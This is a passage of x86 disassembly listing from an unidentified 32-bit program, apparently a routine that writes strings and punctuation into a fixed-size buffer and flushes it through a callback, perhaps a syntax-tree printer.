  403473:	88 14 0b             	mov    %dl,(%ebx,%ecx,1)
  403476:	81 fe 53 7c 42 00    	cmp    $0x427c53,%esi
  40347c:	88 93 04 01 00 00    	mov    %dl,0x104(%ebx)
  403482:	0f 84 f4 11 00 00    	je     0x40467c
  403488:	3d ff 00 00 00       	cmp    $0xff,%eax
  40348d:	0f b6 16             	movzbl (%esi),%edx
  403490:	75 d3                	jne    0x403465
  403492:	8b 83 0c 01 00 00    	mov    0x10c(%ebx),%eax
  403498:	88 54 24 1c          	mov    %dl,0x1c(%esp)
  40349c:	c6 83 ff 00 00 00 00 	movb   $0x0,0xff(%ebx)
  4034a3:	c7 44 24 04 ff 00 00 	movl   $0xff,0x4(%esp)
  4034aa:	00 
  4034ab:	89 1c 24             	mov    %ebx,(%esp)
  4034ae:	89 44 24 08          	mov    %eax,0x8(%esp)
  4034b2:	ff 93 08 01 00 00    	call   *0x108(%ebx)
  4034b8:	83 83 20 01 00 00 01 	addl   $0x1,0x120(%ebx)
  4034bf:	b8 01 00 00 00       	mov    $0x1,%eax
  4034c4:	31 c9                	xor    %ecx,%ecx
  4034c6:	0f b6 54 24 1c       	movzbl 0x1c(%esp),%edx
  4034cb:	eb 9d                	jmp    0x40346a
  4034cd:	8b 41 04             	mov    0x4(%ecx),%eax
  4034d0:	c7 44 24 04 2c 7a 42 	movl   $0x427a2c,0x4(%esp)
  4034d7:	00 
  4034d8:	89 44 24 08          	mov    %eax,0x8(%esp)
  4034dc:	8d 44 24 40          	lea    0x40(%esp),%eax
  4034e0:	89 04 24             	mov    %eax,(%esp)
  4034e3:	89 c7                	mov    %eax,%edi
  4034e5:	89 44 24 20          	mov    %eax,0x20(%esp)
  4034e9:	e8 ea c9 00 00       	call   0x40fed8
  4034ee:	8b 17                	mov    (%edi),%edx
  4034f0:	83 c7 04             	add    $0x4,%edi
  4034f3:	8d 82 ff fe fe fe    	lea    -0x1010101(%edx),%eax
  4034f9:	f7 d2                	not    %edx
  4034fb:	21 d0                	and    %edx,%eax
  4034fd:	25 80 80 80 80       	and    $0x80808080,%eax
  403502:	74 ea                	je     0x4034ee
  403504:	89 c2                	mov    %eax,%edx
  403506:	8b 6c 24 20          	mov    0x20(%esp),%ebp
  40350a:	c1 ea 10             	shr    $0x10,%edx
  40350d:	a9 80 80 00 00       	test   $0x8080,%eax
  403512:	0f 44 c2             	cmove  %edx,%eax
  403515:	8d 57 02             	lea    0x2(%edi),%edx
  403518:	0f 44 fa             	cmove  %edx,%edi
  40351b:	00 c0                	add    %al,%al
  40351d:	83 df 03             	sbb    $0x3,%edi
  403520:	29 ef                	sub    %ebp,%edi
  403522:	0f 84 d8 fa ff ff    	je     0x403000
  403528:	8b 83 00 01 00 00    	mov    0x100(%ebx),%eax
  40352e:	31 f6                	xor    %esi,%esi
  403530:	eb 1f                	jmp    0x403551
  403532:	89 c1                	mov    %eax,%ecx
  403534:	83 c0 01             	add    $0x1,%eax
  403537:	83 c6 01             	add    $0x1,%esi
  40353a:	89 83 00 01 00 00    	mov    %eax,0x100(%ebx)
  403540:	88 14 0b             	mov    %dl,(%ebx,%ecx,1)
  403543:	39 fe                	cmp    %edi,%esi
  403545:	88 93 04 01 00 00    	mov    %dl,0x104(%ebx)
  40354b:	0f 84 af fa ff ff    	je     0x403000
  403551:	3d ff 00 00 00       	cmp    $0xff,%eax
  403556:	0f b6 54 35 00       	movzbl 0x0(%ebp,%esi,1),%edx
  40355b:	75 d5                	jne    0x403532
  40355d:	8b 83 0c 01 00 00    	mov    0x10c(%ebx),%eax
  403563:	88 54 24 18          	mov    %dl,0x18(%esp)
  403567:	c6 83 ff 00 00 00 00 	movb   $0x0,0xff(%ebx)
  40356e:	c7 44 24 04 ff 00 00 	movl   $0xff,0x4(%esp)
  403575:	00 
  403576:	89 1c 24             	mov    %ebx,(%esp)
  403579:	89 44 24 08          	mov    %eax,0x8(%esp)
  40357d:	ff 93 08 01 00 00    	call   *0x108(%ebx)
  403583:	83 83 20 01 00 00 01 	addl   $0x1,0x120(%ebx)
  40358a:	b8 01 00 00 00       	mov    $0x1,%eax
  40358f:	31 c9                	xor    %ecx,%ecx
  403591:	0f b6 54 24 18       	movzbl 0x18(%esp),%edx
  403596:	eb 9f                	jmp    0x403537
  403598:	89 d8                	mov    %ebx,%eax
  40359a:	ba 80 7b 42 00       	mov    $0x427b80,%edx
  40359f:	e8 1c f8 ff ff       	call   0x402dc0
  4035a4:	8b 4d 04             	mov    0x4(%ebp),%ecx
  4035a7:	8b 54 24 18          	mov    0x18(%esp),%edx
  4035ab:	89 d8                	mov    %ebx,%eax
  4035ad:	e8 5e f9 ff ff       	call   0x402f10
  4035b2:	e9 49 fa ff ff       	jmp    0x403000
  4035b7:	8b 83 00 01 00 00    	mov    0x100(%ebx),%eax
  4035bd:	8b 51 04             	mov    0x4(%ecx),%edx
  4035c0:	3d ff 00 00 00       	cmp    $0xff,%eax
  4035c5:	0f 84 3a 18 00 00    	je     0x404e05
  4035cb:	8d 48 01             	lea    0x1(%eax),%ecx
  4035ce:	89 8b 00 01 00 00    	mov    %ecx,0x100(%ebx)
  4035d4:	88 14 03             	mov    %dl,(%ebx,%eax,1)
  4035d7:	88 93 04 01 00 00    	mov    %dl,0x104(%ebx)
  4035dd:	e9 1e fa ff ff       	jmp    0x403000
  4035e2:	8b 7c 24 18          	mov    0x18(%esp),%edi
  4035e6:	8b 49 04             	mov    0x4(%ecx),%ecx
  4035e9:	89 d8                	mov    %ebx,%eax
  4035eb:	89 fa                	mov    %edi,%edx
  4035ed:	e8 1e f9 ff ff       	call   0x402f10
  4035f2:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4035f5:	89 fa                	mov    %edi,%edx
  4035f7:	89 d8                	mov    %ebx,%eax
  4035f9:	e8 12 f9 ff ff       	call   0x402f10
  4035fe:	e9 fd f9 ff ff       	jmp    0x403000
  403603:	8b 83 00 01 00 00    	mov    0x100(%ebx),%eax
  403609:	be 0c 7c 42 00       	mov    $0x427c0c,%esi
  40360e:	eb 23                	jmp    0x403633
  403610:	89 c1                	mov    %eax,%ecx
  403612:	83 c0 01             	add    $0x1,%eax
  403615:	83 c6 01             	add    $0x1,%esi
  403618:	89 83 00 01 00 00    	mov    %eax,0x100(%ebx)
  40361e:	88 14 0b             	mov    %dl,(%ebx,%ecx,1)
  403621:	81 fe 1a 7c 42 00    	cmp    $0x427c1a,%esi
  403627:	88 93 04 01 00 00    	mov    %dl,0x104(%ebx)
  40362d:	0f 84 2d 0f 00 00    	je     0x404560
  403633:	3d ff 00 00 00       	cmp    $0xff,%eax
  403638:	0f b6 16             	movzbl (%esi),%edx
  40363b:	75 d3                	jne    0x403610
  40363d:	8b 83 0c 01 00 00    	mov    0x10c(%ebx),%eax
  403643:	88 54 24 1c          	mov    %dl,0x1c(%esp)
  403647:	c6 83 ff 00 00 00 00 	movb   $0x0,0xff(%ebx)
  40364e:	c7 44 24 04 ff 00 00 	movl   $0xff,0x4(%esp)
  403655:	00 
  403656:	89 1c 24             	mov    %ebx,(%esp)
  403659:	89 44 24 08          	mov    %eax,0x8(%esp)
  40365d:	ff 93 08 01 00 00    	call   *0x108(%ebx)
  403663:	83 83 20 01 00 00 01 	addl   $0x1,0x120(%ebx)
  40366a:	b8 01 00 00 00       	mov    $0x1,%eax
  40366f:	31 c9                	xor    %ecx,%ecx
  403671:	0f b6 54 24 1c       	movzbl 0x1c(%esp),%edx
  403676:	eb 9d                	jmp    0x403615
  403678:	c7 83 18 01 00 00 01 	movl   $0x1,0x118(%ebx)
  40367f:	00 00 00 
  403682:	e9 79 f9 ff ff       	jmp    0x403000
  403687:	8b 41 08             	mov    0x8(%ecx),%eax
  40368a:	83 38 39             	cmpl   $0x39,(%eax)
  40368d:	0f 85 ed f9 ff ff    	jne    0x403080
  403693:	8b 50 08             	mov    0x8(%eax),%edx
  403696:	83 3a 3a             	cmpl   $0x3a,(%edx)
  403699:	0f 85 e1 f9 ff ff    	jne    0x403080
  40369f:	8b 40 04             	mov    0x4(%eax),%eax
  4036a2:	8b 69 04             	mov    0x4(%ecx),%ebp
  4036a5:	bf eb 7b 42 00       	mov    $0x427beb,%edi
  4036aa:	b9 03 00 00 00       	mov    $0x3,%ecx
  4036af:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  4036b3:	8b 42 04             	mov    0x4(%edx),%eax
  4036b6:	89 44 24 20          	mov    %eax,0x20(%esp)
  4036ba:	8b 42 08             	mov    0x8(%edx),%eax
  4036bd:	89 44 24 24          	mov    %eax,0x24(%esp)
  4036c1:	8b 45 04             	mov    0x4(%ebp),%eax
  4036c4:	8b 30                	mov    (%eax),%esi
  4036c6:	f3 a6                	repz cmpsb %es:(%edi),%ds:(%esi)
  4036c8:	0f 84 0e 1d 00 00    	je     0x4053dc
  4036ce:	89 d8                	mov    %ebx,%eax
  4036d0:	ba f2 7b 42 00       	mov    $0x427bf2,%edx
  4036d5:	e8 e6 f6 ff ff       	call   0x402dc0
  4036da:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  4036de:	83 78 04 00          	cmpl   $0x0,0x4(%eax)
  4036e2:	74 19                	je     0x4036fd
  4036e4:	8b 54 24 18          	mov    0x18(%esp),%edx
  4036e8:	89 c1                	mov    %eax,%ecx
  4036ea:	89 d8                	mov    %ebx,%eax
  4036ec:	e8 af 32 00 00       	call   0x4069a0
  4036f1:	ba 20 00 00 00       	mov    $0x20,%edx
  4036f6:	89 d8                	mov    %ebx,%eax
  4036f8:	e8 03 f2 ff ff       	call   0x402900
  4036fd:	8b 7c 24 18          	mov    0x18(%esp),%edi
  403701:	8b 4c 24 20          	mov    0x20(%esp),%ecx
  403705:	89 d8                	mov    %ebx,%eax
  403707:	89 fa                	mov    %edi,%edx
  403709:	e8 02 f8 ff ff       	call   0x402f10
  40370e:	8b 44 24 24          	mov    0x24(%esp),%eax
  403712:	85 c0                	test   %eax,%eax
  403714:	0f 84 e6 f8 ff ff    	je     0x403000
  40371a:	89 c1                	mov    %eax,%ecx
  40371c:	89 fa                	mov    %edi,%edx
  40371e:	89 d8                	mov    %ebx,%eax
  403720:	e8 7b 32 00 00       	call   0x4069a0
  403725:	e9 d6 f8 ff ff       	jmp    0x403000
  40372a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  403730:	c7 83 18 01 00 00 01 	movl   $0x1,0x118(%ebx)
  403737:	00 00 00 
  40373a:	e9 c1 f8 ff ff       	jmp    0x403000
  40373f:	8b 41 08             	mov    0x8(%ecx),%eax
  403742:	83 38 37             	cmpl   $0x37,(%eax)
  403745:	0f 85 35 f9 ff ff    	jne    0x403080
  40374b:	8b 79 04             	mov    0x4(%ecx),%edi
  40374e:	8b 77 04             	mov    0x4(%edi),%esi
  403751:	89 7c 24 1c          	mov    %edi,0x1c(%esp)
  403755:	8b 16                	mov    (%esi),%edx
  403757:	80 7a 01 63          	cmpb   $0x63,0x1(%edx)
  40375b:	0f 84 9d 19 00 00    	je     0x4050fe
  403761:	8b 7c 24 1c          	mov    0x1c(%esp),%edi
  403765:	83 3f 31             	cmpl   $0x31,(%edi)
  403768:	0f 84 ed 0c 00 00    	je     0x40445b
  40376e:	89 d6                	mov    %edx,%esi
  403770:	b9 03 00 00 00       	mov    $0x3,%ecx
  403775:	bf e5 7b 42 00       	mov    $0x427be5,%edi
  40377a:	f3 a6                	repz cmpsb %es:(%edi),%ds:(%esi)
  40377c:	8b 48 04             	mov    0x4(%eax),%ecx
  40377f:	75 09                	jne    0x40378a
  403781:	83 39 03             	cmpl   $0x3,(%ecx)
  403784:	0f 84 2d 1c 00 00    	je     0x4053b7
  40378a:	8b 54 24 18          	mov    0x18(%esp),%edx
  40378e:	89 d8                	mov    %ebx,%eax
  403790:	e8 0b 32 00 00       	call   0x4069a0
  403795:	8b 45 04             	mov    0x4(%ebp),%eax
  403798:	b9 03 00 00 00       	mov    $0x3,%ecx
  40379d:	bf e8 7b 42 00       	mov    $0x427be8,%edi
  4037a2:	8b 50 04             	mov    0x4(%eax),%edx
  4037a5:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  4037a9:	8b 12                	mov    (%edx),%edx
  4037ab:	89 d6                	mov    %edx,%esi
  4037ad:	f3 a6                	repz cmpsb %es:(%edi),%ds:(%esi)
  4037af:	0f 97 c1             	seta   %cl
  4037b2:	89 ce                	mov    %ecx,%esi
  4037b4:	0f 92 c1             	setb   %cl
  4037b7:	89 f0                	mov    %esi,%eax
  4037b9:	38 c8                	cmp    %cl,%al
  4037bb:	0f 84 50 1b 00 00    	je     0x405311
  4037c1:	b9 03 00 00 00       	mov    $0x3,%ecx
  4037c6:	89 d6                	mov    %edx,%esi
  4037c8:	bf e5 7b 42 00       	mov    $0x427be5,%edi
  4037cd:	f3 a6                	repz cmpsb %es:(%edi),%ds:(%esi)
  4037cf:	0f 85 a6 1b 00 00    	jne    0x40537b
  4037d5:	8b 45 08             	mov    0x8(%ebp),%eax
  4037d8:	8b 54 24 18          	mov    0x18(%esp),%edx
  4037dc:	8b 48 08             	mov    0x8(%eax),%ecx
  4037df:	89 d8                	mov    %ebx,%eax
  4037e1:	e8 ba 31 00 00       	call   0x4069a0
  4037e6:	8b 45 04             	mov    0x4(%ebp),%eax
  4037e9:	83 38 31             	cmpl   $0x31,(%eax)
  4037ec:	0f 85 0e f8 ff ff    	jne    0x403000
  4037f2:	8b 40 04             	mov    0x4(%eax),%eax
  4037f5:	83 78 08 01          	cmpl   $0x1,0x8(%eax)
  4037f9:	0f 85 01 f8 ff ff    	jne    0x403000
  4037ff:	8b 40 04             	mov    0x4(%eax),%eax
  403802:	80 38 3e             	cmpb   $0x3e,(%eax)
  403805:	0f 85 f5 f7 ff ff    	jne    0x403000
  40380b:	ba 29 00 00 00       	mov    $0x29,%edx
  403810:	89 d8                	mov    %ebx,%eax
  403812:	e8 e9 f0 ff ff       	call   0x402900
  403817:	e9 e4 f7 ff ff       	jmp    0x403000
  40381c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  403820:	8b 41 04             	mov    0x4(%ecx),%eax
  403823:	8b 69 08             	mov    0x8(%ecx),%ebp
  403826:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  40382a:	8b 00                	mov    (%eax),%eax
  40382c:	83 f8 31             	cmp    $0x31,%eax
  40382f:	0f 84 a3 11 00 00    	je     0x4049d8
  403835:	83 f8 33             	cmp    $0x33,%eax
  403838:	0f 84 62 13 00 00    	je     0x404ba0
  40383e:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  403842:	8b 54 24 18          	mov    0x18(%esp),%edx
  403846:	89 d8                	mov    %ebx,%eax
  403848:	e8 b3 30 00 00       	call   0x406900
  40384d:	8b 54 24 18          	mov    0x18(%esp),%edx
  403851:	89 e9                	mov    %ebp,%ecx
  403853:	89 d8                	mov    %ebx,%eax
  403855:	e8 46 31 00 00       	call   0x4069a0
  40385a:	e9 a1 f7 ff ff       	jmp    0x403000
  40385f:	8b 83 00 01 00 00    	mov    0x100(%ebx),%eax
  403865:	be d2 7b 42 00       	mov    $0x427bd2,%esi
  40386a:	eb 27                	jmp    0x403893
  40386c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  403870:	89 c1                	mov    %eax,%ecx
  403872:	83 c0 01             	add    $0x1,%eax
  403875:	83 c6 01             	add    $0x1,%esi
  403878:	89 83 00 01 00 00    	mov    %eax,0x100(%ebx)
  40387e:	88 14 0b             	mov    %dl,(%ebx,%ecx,1)
  403881:	81 fe db 7b 42 00    	cmp    $0x427bdb,%esi
  403887:	88 93 04 01 00 00    	mov    %dl,0x104(%ebx)
  40388d:	0f 84 4a 0c 00 00    	je     0x4044dd
  403893:	3d ff 00 00 00       	cmp    $0xff,%eax
  403898:	0f b6 16             	movzbl (%esi),%edx
  40389b:	75 d3                	jne    0x403870
  40389d:	8b 83 0c 01 00 00    	mov    0x10c(%ebx),%eax
  4038a3:	88 54 24 1c          	mov    %dl,0x1c(%esp)
  4038a7:	c6 83 ff 00 00 00 00 	movb   $0x0,0xff(%ebx)
  4038ae:	c7 44 24 04 ff 00 00 	movl   $0xff,0x4(%esp)
  4038b5:	00 
  4038b6:	89 1c 24             	mov    %ebx,(%esp)
  4038b9:	89 44 24 08          	mov    %eax,0x8(%esp)
  4038bd:	ff 93 08 01 00 00    	call   *0x108(%ebx)
  4038c3:	83 83 20 01 00 00 01 	addl   $0x1,0x120(%ebx)
  4038ca:	b8 01 00 00 00       	mov    $0x1,%eax
  4038cf:	31 c9                	xor    %ecx,%ecx
  4038d1:	0f b6 54 24 1c       	movzbl 0x1c(%esp),%edx
  4038d6:	eb 9d                	jmp    0x403875
  4038d8:	8b 83 00 01 00 00    	mov    0x100(%ebx),%eax
  4038de:	be d2 7b 42 00       	mov    $0x427bd2,%esi
  4038e3:	eb 23                	jmp    0x403908
  4038e5:	89 c1                	mov    %eax,%ecx
  4038e7:	83 c0 01             	add    $0x1,%eax
  4038ea:	83 c6 01             	add    $0x1,%esi
  4038ed:	89 83 00 01 00 00    	mov    %eax,0x100(%ebx)
  4038f3:	88 14 0b             	mov    %dl,(%ebx,%ecx,1)
  4038f6:	81 fe db 7b 42 00    	cmp    $0x427bdb,%esi
  4038fc:	88 93 04 01 00 00    	mov    %dl,0x104(%ebx)
  403902:	0f 84 87 0d 00 00    	je     0x40468f
  403908:	3d ff 00 00 00       	cmp    $0xff,%eax
  40390d:	0f b6 16             	movzbl (%esi),%edx
  403910:	75 d3                	jne    0x4038e5
  403912:	8b 83 0c 01 00 00    	mov    0x10c(%ebx),%eax
  403918:	88 54 24 1c          	mov    %dl,0x1c(%esp)
  40391c:	c6 83 ff 00 00 00 00 	movb   $0x0,0xff(%ebx)
  403923:	c7 44 24 04 ff 00 00 	movl   $0xff,0x4(%esp)
  40392a:	00 
  40392b:	89 1c 24             	mov    %ebx,(%esp)
  40392e:	89 44 24 08          	mov    %eax,0x8(%esp)
  403932:	ff 93 08 01 00 00    	call   *0x108(%ebx)
  403938:	83 83 20 01 00 00 01 	addl   $0x1,0x120(%ebx)
  40393f:	b8 01 00 00 00       	mov    $0x1,%eax
  403944:	31 c9                	xor    %ecx,%ecx
  403946:	0f b6 54 24 1c       	movzbl 0x1c(%esp),%edx
  40394b:	eb 9d                	jmp    0x4038ea
  40394d:	8b 69 04             	mov    0x4(%ecx),%ebp
  403950:	8b 83 00 01 00 00    	mov    0x100(%ebx),%eax
  403956:	be c9 7b 42 00       	mov    $0x427bc9,%esi
  40395b:	8b 7d 08             	mov    0x8(%ebp),%edi
  40395e:	eb 23                	jmp    0x403983
  403960:	89 c1                	mov    %eax,%ecx
  403962:	83 c0 01             	add    $0x1,%eax
  403965:	83 c6 01             	add    $0x1,%esi
  403968:	89 83 00 01 00 00    	mov    %eax,0x100(%ebx)
  40396e:	88 14 0b             	mov    %dl,(%ebx,%ecx,1)
  403971:	81 fe d1 7b 42 00    	cmp    $0x427bd1,%esi
  403977:	88 93 04 01 00 00    	mov    %dl,0x104(%ebx)
  40397d:	0f 84 54 0c 00 00    	je     0x4045d7
  403983:	3d ff 00 00 00       	cmp    $0xff,%eax
  403988:	0f b6 16             	movzbl (%esi),%edx
  40398b:	75 d3                	jne    0x403960
  40398d:	8b 83 0c 01 00 00    	mov    0x10c(%ebx),%eax
  403993:	88 54 24 18          	mov    %dl,0x18(%esp)
  403997:	c6 83 ff 00 00 00 00 	movb   $0x0,0xff(%ebx)
  40399e:	c7 44 24 04 ff 00 00 	movl   $0xff,0x4(%esp)
  4039a5:	00 
  4039a6:	89 1c 24             	mov    %ebx,(%esp)
  4039a9:	89 44 24 08          	mov    %eax,0x8(%esp)
  4039ad:	ff 93 08 01 00 00    	call   *0x108(%ebx)
  4039b3:	83 83 20 01 00 00 01 	addl   $0x1,0x120(%ebx)
  4039ba:	b8 01 00 00 00       	mov    $0x1,%eax
  4039bf:	31 c9                	xor    %ecx,%ecx
  4039c1:	0f b6 54 24 18       	movzbl 0x18(%esp),%edx
  4039c6:	eb 9d                	jmp    0x403965
  4039c8:	8b 49 04             	mov    0x4(%ecx),%ecx
  4039cb:	8b 75 08             	mov    0x8(%ebp),%esi
  4039ce:	85 c9                	test   %ecx,%ecx
  4039d0:	74 0b                	je     0x4039dd
  4039d2:	8b 54 24 18          	mov    0x18(%esp),%edx
  4039d6:	89 d8                	mov    %ebx,%eax
  4039d8:	e8 33 f5 ff ff       	call   0x402f10
  4039dd:	89 d8                	mov    %ebx,%eax
  4039df:	ba 7b 00 00 00       	mov    $0x7b,%edx
  4039e4:	e8 17 ef ff ff       	call   0x402900
  4039e9:	8b 54 24 18          	mov    0x18(%esp),%edx
  4039ed:	89 d8                	mov    %ebx,%eax
  4039ef:	89 f1                	mov    %esi,%ecx
  4039f1:	e8 1a f5 ff ff       	call   0x402f10
  4039f6:	ba 7d 00 00 00       	mov    $0x7d,%edx
  4039fb:	89 d8                	mov    %ebx,%eax
  4039fd:	e8 fe ee ff ff       	call   0x402900
  403a02:	e9 f9 f5 ff ff       	jmp    0x403000
  403a07:	8b 49 04             	mov    0x4(%ecx),%ecx
  403a0a:	85 c9                	test   %ecx,%ecx
  403a0c:	74 0b                	je     0x403a19
  403a0e:	8b 54 24 18          	mov    0x18(%esp),%edx
  403a12:	89 d8                	mov    %ebx,%eax
  403a14:	e8 f7 f4 ff ff       	call   0x402f10
  403a19:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403a1c:	85 c9                	test   %ecx,%ecx
  403a1e:	0f 84 dc f5 ff ff    	je     0x403000
  403a24:	8b b3 00 01 00 00    	mov    0x100(%ebx),%esi
  403a2a:	81 fe fd 00 00 00    	cmp    $0xfd,%esi
  403a30:	0f 87 cb 11 00 00    	ja     0x404c01
  403a36:	bf c6 7b 42 00       	mov    $0x427bc6,%edi
  403a3b:	eb 26                	jmp    0x403a63
  403a3d:	8d 76 00             	lea    0x0(%esi),%esi
  403a40:	89 f2                	mov    %esi,%edx
  403a42:	83 c6 01             	add    $0x1,%esi
  403a45:	83 c7 01             	add    $0x1,%edi
  403a48:	89 b3 00 01 00 00    	mov    %esi,0x100(%ebx)
  403a4e:	88 04 13             	mov    %al,(%ebx,%edx,1)
  403a51:	81 ff c8 7b 42 00    	cmp    $0x427bc8,%edi
  403a57:	88 83 04 01 00 00    	mov    %al,0x104(%ebx)
  403a5d:	0f 84 3f 0c 00 00    	je     0x4046a2
  403a63:	81 fe ff 00 00 00    	cmp    $0xff,%esi
  403a69:	0f b6 07             	movzbl (%edi),%eax
  403a6c:	75 d2                	jne    0x403a40
  403a6e:	8b 93 0c 01 00 00    	mov    0x10c(%ebx),%edx
  403a74:	88 44 24 1c          	mov    %al,0x1c(%esp)
  403a78:	be 01 00 00 00       	mov    $0x1,%esi
  403a7d:	c6 83 ff 00 00 00 00 	movb   $0x0,0xff(%ebx)
  403a84:	c7 44 24 04 ff 00 00 	movl   $0xff,0x4(%esp)
  403a8b:	00 
  403a8c:	89 1c 24             	mov    %ebx,(%esp)
  403a8f:	89 54 24 08          	mov    %edx,0x8(%esp)
  403a93:	ff 93 08 01 00 00    	call   *0x108(%ebx)
  403a99:	83 83 20 01 00 00 01 	addl   $0x1,0x120(%ebx)
  403aa0:	31 d2                	xor    %edx,%edx
  403aa2:	0f b6 44 24 1c       	movzbl 0x1c(%esp),%eax
  403aa7:	eb 9c                	jmp    0x403a45
  403aa9:	66 83 79 0a 00       	cmpw   $0x0,0xa(%ecx)
  403aae:	0f 85 aa 0e 00 00    	jne    0x40495e
  403ab4:	8b 4d 04             	mov    0x4(%ebp),%ecx
  403ab7:	81 79 04 60 8d 42 00 	cmpl   $0x428d60,0x4(%ecx)
  403abe:	74 30                	je     0x403af0
  403ac0:	8b 54 24 18          	mov    0x18(%esp),%edx
  403ac4:	89 d8                	mov    %ebx,%eax
  403ac6:	e8 45 f4 ff ff       	call   0x402f10
  403acb:	8b 83 00 01 00 00    	mov    0x100(%ebx),%eax
  403ad1:	3d ff 00 00 00       	cmp    $0xff,%eax
  403ad6:	0f 84 37 15 00 00    	je     0x405013
  403adc:	8d 50 01             	lea    0x1(%eax),%edx
  403adf:	89 93 00 01 00 00    	mov    %edx,0x100(%ebx)
  403ae5:	c6 04 03 20          	movb   $0x20,(%ebx,%eax,1)
  403ae9:	c6 83 04 01 00 00 20 	movb   $0x20,0x104(%ebx)
  403af0:	66 83 7d 08 00       	cmpw   $0x0,0x8(%ebp)
  403af5:	0f 84 e9 0d 00 00    	je     0x4048e4
  403afb:	8b 83 00 01 00 00    	mov    0x100(%ebx),%eax
  403b01:	be b8 7b 42 00       	mov    $0x427bb8,%esi
  403b06:	eb 2b                	jmp    0x403b33
  403b08:	90                   	nop
  403b09:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  403b10:	89 c1                	mov    %eax,%ecx
  403b12:	83 c0 01             	add    $0x1,%eax
  403b15:	83 c6 01             	add    $0x1,%esi
  403b18:	89 83 00 01 00 00    	mov    %eax,0x100(%ebx)
  403b1e:	88 14 0b             	mov    %dl,(%ebx,%ecx,1)
  403b21:	81 fe be 7b 42 00    	cmp    $0x427bbe,%esi
  403b27:	88 93 04 01 00 00    	mov    %dl,0x104(%ebx)
  403b2d:	0f 84 cd f4 ff ff    	je     0x403000
  403b33:	3d ff 00 00 00       	cmp    $0xff,%eax
  403b38:	0f b6 16             	movzbl (%esi),%edx
  403b3b:	75 d3                	jne    0x403b10
  403b3d:	8b 83 0c 01 00 00    	mov    0x10c(%ebx),%eax
  403b43:	88 54 24 18          	mov    %dl,0x18(%esp)
  403b47:	c6 83 ff 00 00 00 00 	movb   $0x0,0xff(%ebx)
  403b4e:	c7 44 24 04 ff 00 00 	movl   $0xff,0x4(%esp)
  403b55:	00 
  403b56:	89 1c 24             	mov    %ebx,(%esp)
  403b59:	89 44 24 08          	mov    %eax,0x8(%esp)
  403b5d:	ff 93 08 01 00 00    	call   *0x108(%ebx)
  403b63:	83 83 20 01 00 00 01 	addl   $0x1,0x120(%ebx)
  403b6a:	b8 01 00 00 00       	mov    $0x1,%eax
  403b6f:	31 c9                	xor    %ecx,%ecx
  403b71:	0f b6 54 24 18       	movzbl 0x18(%esp),%edx
  403b76:	eb 9d                	jmp    0x403b15
  403b78:	8b 49 04             	mov    0x4(%ecx),%ecx
  403b7b:	8b 54 24 18          	mov    0x18(%esp),%edx
  403b7f:	89 d8                	mov    %ebx,%eax
  403b81:	e8 7a 2d 00 00       	call   0x406900
  403b86:	e9 75 f4 ff ff       	jmp    0x403000
  403b8b:	8b 83 14 01 00 00    	mov    0x114(%ebx),%eax
  403b91:	89 4c 24 44          	mov    %ecx,0x44(%esp)
  403b95:	8b 54 24 18          	mov    0x18(%esp),%edx
  403b99:	c7 44 24 48 00 00 00 	movl   $0x0,0x48(%esp)
  403ba0:	00 
  403ba1:	89 44 24 40          	mov    %eax,0x40(%esp)
  403ba5:	8d 44 24 40          	lea    0x40(%esp),%eax
  403ba9:	89 83 14 01 00 00    	mov    %eax,0x114(%ebx)
  403baf:	8b 83 10 01 00 00    	mov    0x110(%ebx),%eax
  403bb5:	8b 49 08             	mov    0x8(%ecx),%ecx
  403bb8:	89 44 24 4c          	mov    %eax,0x4c(%esp)
  403bbc:	89 d8                	mov    %ebx,%eax
  403bbe:	e8 4d f3 ff ff       	call   0x402f10
  403bc3:	8b 74 24 48          	mov    0x48(%esp),%esi
  403bc7:	85 f6                	test   %esi,%esi
  403bc9:	75 0d                	jne    0x403bd8
  403bcb:	8b 54 24 18          	mov    0x18(%esp),%edx
  403bcf:	89 e9                	mov    %ebp,%ecx
  403bd1:	89 d8                	mov    %ebx,%eax
  403bd3:	e8 88 1a 00 00       	call   0x405660
  403bd8:	8b 44 24 40          	mov    0x40(%esp),%eax
  403bdc:	89 83 14 01 00 00    	mov    %eax,0x114(%ebx)
  403be2:	e9 19 f4 ff ff       	jmp    0x403000
  403be7:	8b bb 14 01 00 00    	mov    0x114(%ebx),%edi
  403bed:	8d 44 24 40          	lea    0x40(%esp),%eax
  403bf1:	89 6c 24 44          	mov    %ebp,0x44(%esp)
  403bf5:	c7 44 24 48 00 00 00 	movl   $0x0,0x48(%esp)
  403bfc:	00 
  403bfd:	89 c1                	mov    %eax,%ecx
  403bff:	89 44 24 20          	mov    %eax,0x20(%esp)
  403c03:	89 83 14 01 00 00    	mov    %eax,0x114(%ebx)
  403c09:	89 fe                	mov    %edi,%esi
  403c0b:	89 7c 24 24          	mov    %edi,0x24(%esp)
  403c0f:	89 7c 24 40          	mov    %edi,0x40(%esp)
  403c13:	89 c7                	mov    %eax,%edi
  403c15:	8b 83 10 01 00 00    	mov    0x110(%ebx),%eax
  403c1b:	85 f6                	test   %esi,%esi
  403c1d:	89 44 24 4c          	mov    %eax,0x4c(%esp)
  403c21:	0f 84 68 17 00 00    	je     0x40538f
  403c27:	8b 46 04             	mov    0x4(%esi),%eax
  403c2a:	8b 00                	mov    (%eax),%eax
  403c2c:	83 e8 19             	sub    $0x19,%eax
  403c2f:	83 f8 02             	cmp    $0x2,%eax
  403c32:	0f 87 57 17 00 00    	ja     0x40538f
  403c38:	89 f0                	mov    %esi,%eax
  403c3a:	89 6c 24 28          	mov    %ebp,0x28(%esp)
  403c3e:	be 01 00 00 00       	mov    $0x1,%esi
  403c43:	89 4c 24 1c          	mov    %ecx,0x1c(%esp)
  403c47:	eb 14                	jmp    0x403c5d
  403c49:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  403c50:	8b 50 04             	mov    0x4(%eax),%edx
  403c53:	8b 12                	mov    (%edx),%edx
  403c55:	83 ea 19             	sub    $0x19,%edx
  403c58:	83 fa 02             	cmp    $0x2,%edx
